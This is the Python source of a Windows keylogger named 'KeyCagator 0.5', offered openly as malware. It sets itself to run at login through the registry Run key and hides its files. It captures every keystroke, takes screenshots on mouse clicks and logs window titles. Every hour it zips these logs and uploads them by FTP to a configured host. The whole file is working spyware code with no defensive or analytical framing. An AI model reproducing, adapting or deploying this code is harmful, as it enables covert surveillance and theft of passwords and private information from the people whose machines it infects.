#!usr/bin/python
#KeyCagator 0.5 (C) Doddy Hackman 2011

import threading,pyHook,pythoncom,sys,win32api,win32con,time,win32gui,os,re,socket,glob,zipfile,ftplib,_winreg
from PIL import ImageGrab

esconder = "c:/windows/bien"

registro = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0, _winreg.KEY_ALL_ACCESS)
_winreg.SetValueEx(registro,"uber",0,_winreg.REG_SZ,sys.argv[0])

host = "localhost"
user = "doddy"
passw = "123"

#Funciones#

def savefile(text):
 fin = esconder+"/"+"logs.html"
 file = open(fin,"a")
 file.write(text)
 file.close
    
def subirftp(file):
 try:
  enter = ftplib.FTP(host,user,passw)
  archivo = open(file,"rb")             
  enter.storbinary("STOR "+file,archivo)         
  archivo.close()                              
  enter.quit()
 except:
  pass

def getmyip():
 return socket.gethostbyname(socket.gethostname())

def ordenarzip(dir):
 files = glob.glob(dir+"*")
 name = getmyip()+".zip"
 zipa = zipfile.ZipFile(name,"w",zipfile.ZIP_DEFLATED)
 for file in files:
  if os.path.isfile(file):
   zipa.write(file)
 zipa.close()
 subirftp(name)
 os.remove(name)

def archivo(mo,op):
 if op == "ocultar":
  win32api.SetFileAttributes(mo,win32con.FILE_ATTRIBUTE_HIDDEN)
 if op == "mostrar":
  win32api.SetFileAttributes(mo,win32con.FILE_ATTRIBUTE_NORMAL)

def installer():
 try:
  os.mkdir(esconder,0777)
 except:
  pass
 archivo(esconder,"ocultar")
 
def uno():
 def toma(frase):
  letra = chr(frase.Ascii)
  savefile(letra)
  if frase.Key == "Return":
   savefile("<br>[enter]<br>")
  if frase.Key == "Space":
   savefile("<br>[space]<br>")
  if frase.Key == "Back":
   savefile("<br>[backspace]<br>")
  return 1

 def capturar():
  nave = pyHook.HookManager()
  nave.KeyDown = toma
  nave.HookKeyboard()
  pythoncom.PumpMessages()

 while 1:
  capturar()

def probardos():

 def trem(e):
  tiempo = time.time()
  ImageGrab.grab().save(esconder+"/"+str(tiempo)+".jpg","JPEG")
  archivo(esconder+"/"+str(tiempo)+".jpg","ocultar")
  savefile("<br><br><img src='"+str(tiempo)+".jpg'>"+"<br><br>")
  return 1

 tren = pyHook.HookManager()
 tren.SubscribeMouseAllButtonsDown(trem)
 tren.HookMouse()
 pythoncom.PumpMessages()
 tren.UnhookMouse()

def tres():
 w = int()
 w=win32gui
 while 1:
  text1 = w.GetWindowText(w.GetForegroundWindow())
  text2 = w.GetWindowText(w.GetForegroundWindow())
  if text1 != text2:
   if not text1 == "" or text1 == " ":
    savefile("<br><br><center><b>[window] : "+text1+"</center></b><br><br>")

def cuatro():
 while 1:
  time.sleep(3600) # 1 Hour
  ordenarzip(esconder+"/")  
 
## Fin de func #

print "\n[+] Keylogger Online\n"

installer()

archivo(sys.argv[0],"ocultar")
 
t1 = threading.Thread(target=uno)
t1.start()
t2 = threading.Thread(target=probardos)
t2.start()
t3 = threading.Thread(target=tres)
t3.start()
t4 = threading.Thread(target=cuatro)
t4.start()


# The End